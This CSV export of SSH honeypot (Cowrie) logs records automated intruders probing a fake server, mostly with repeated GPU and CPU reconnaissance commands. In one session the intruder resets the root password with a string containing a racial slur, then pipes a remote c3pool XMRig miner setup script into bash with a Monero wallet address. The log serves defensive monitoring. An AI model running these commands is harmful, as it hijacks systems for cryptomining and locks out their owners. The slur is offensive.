eventid,username,input,size,compCS,width,outfile,protocol,duration,height,url,keyAlgs,ttylog,data,sensor,arch,session,shasum,message,langCS,timestamp,kexAlgs,encCS,password,version,dst_port,macCS,destfile,client_fingerprint,filename
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,3fe8d9c09636,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:53:52.047150Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,dc41732e5a37,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:53:52.588096Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c0f707334c43,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:53:53.525386Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,b502332dece0,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:53:54.080262Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,6b22e17f9522,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:53:54.605645Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,fa2781107470,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:53:55.132882Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,96bac736f4aa,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:53:57.301094Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,0a9a2703303b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:53:57.903067Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,3dcc5d01cd1a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:53:58.587793Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,ed8e262ec362,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:53:59.386928Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f6b6a2575828,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:53:59.925124Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,de3f07d49008,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:01.635307Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,46cfe627fabd,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:02.207934Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,93c1ffac312d,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:03.060298Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,0349f0f275b7,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:03.993332Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,e684a6fb02d8,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:04.787933Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,e7a63e7a011b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:05.328086Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,4cd28c49667c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:06.198675Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a79094bc9b28,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:06.893004Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,6b4b0bdf1438,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:07.437538Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,6a6658a720f9,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:08.705593Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,68c6d918c13a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:09.248281Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,997a7ca6e2cb,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:10.408347Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,796a29a33313,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:11.186405Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,33d83b840233,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:11.716969Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,1355c9fb0e0a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:12.766795Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,b15fcbf07be4,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:13.299591Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a10bb688f690,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:14.164954Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,8429018ec5ff,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:14.712559Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a40e688985bc,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:15.247723Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,24b3f71df882,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:17.927388Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,809a9ac10599,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:18.882545Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,d484ec4df520,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:19.419984Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,34b3aa2c8b30,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:20.185127Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,2f07698d53a6,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:20.722704Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c0fbc5254570,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:21.517813Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,51719bbe89b8,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:22.067590Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,ed30ee95743c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:22.918649Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,15fe87c3f2e0,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:23.455210Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,bc71d10acc63,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:23.983945Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,077cb01e41e9,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:25.994028Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,0e7eb4bf54d9,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:26.759213Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f664147f7953,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:27.303741Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,7f5fdc7400dc,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:28.709152Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,914afceb82c1,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:29.251574Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,2b53277230df,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:30.048483Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,242990f782e2,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:30.594939Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,1295071f9b1c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:31.430274Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,0667848c4130,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:32.256653Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,6d06e44a5491,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:32.938014Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,9459828e6496,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:33.838573Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,9c4d48853678,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:34.368120Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,2f8de91a24a2,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:34.897683Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,ede3d8c57913,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T05:54:37.042774Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,7885555fb926,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T05:54:37.605081Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,07a5a57027cb,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:40.648502Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f43f768db65d,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:41.849664Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,048658387306,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:42.680408Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,2570d39e2c49,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:43.226676Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,e30c80da3857,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:43.980637Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,dc23ee0d71ad,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:44.815791Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a871cfdbfe91,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:45.360246Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,1c4b9def2ddb,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:45.889930Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,4ee6ca1a4efe,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:46.735951Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a57c78490f5a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:47.259806Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,ce80a96c2459,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:47.797709Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,fa37b6e92270,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:48.703349Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,33ef00b36c21,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:49.231426Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,2b8ecf207613,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:50.073873Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,2f67abb1f9b8,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:51.068981Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,bc4f77fe5533,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:52.696410Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,1404fc1f4a22,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:53.232181Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,2529ae5fbce1,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:53.767469Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,2e457bb18a12,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:54.785178Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,ece8bbe9966b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:54:59.511513Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,5e05e3a64bdf,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:02.081362Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,0b765d22f674,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:02.618147Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,badd58c0e3ab,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:03.647926Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,ea9b699e6ea2,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:04.187994Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,bf69d4e7855d,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:05.122344Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,88b90ef31529,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:07.040443Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,dab8250e9cbf,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:08.070379Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,8376d7e2b131,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:09.516537Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,74b065dcff6c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:10.082652Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,0399d2cbaf4b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:10.841319Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,60909209d067,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:11.404275Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,8d0242eb7af5,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:12.183329Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c4adf0b992e4,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:12.717091Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,d5e1b7ab73e5,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:13.500316Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,0bc4de92d354,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:14.055527Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,2014c2a32c1c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:14.923315Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,1dd73e854b99,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:15.464932Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,79107eef2b8c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:15.999265Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,57f81c9663c1,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:16.912227Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,ed49e8555e60,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:17.479160Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,ec0f298bca08,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:18.010004Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,959f242e6857,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:19.078980Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,3f096d09c725,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:19.580829Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f4809299bcc4,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:20.089379Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,97622dd030ec,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:21.583820Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,64c7aeb0b0fd,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:22.686240Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,4d633f2efe75,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:23.207171Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c91ea644e131,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:23.746420Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,c8515b2ef716,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:55:24.481123Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,c8515b2ef716,,Command not found: nvidia-smi,,2022-10-01T05:55:24.483466Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,c8515b2ef716,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T05:55:24.485989Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,7960b5583a1e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:25.055119Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,640657902187,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:26.326160Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,759d8506e724,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:26.840213Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,8dae8a3a9978,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:27.336276Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,e201539bbac5,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:28.262818Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f5bad36adbff,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:28.773758Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,64514a69a885,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T05:55:29.293620Z,,,,,,,,,
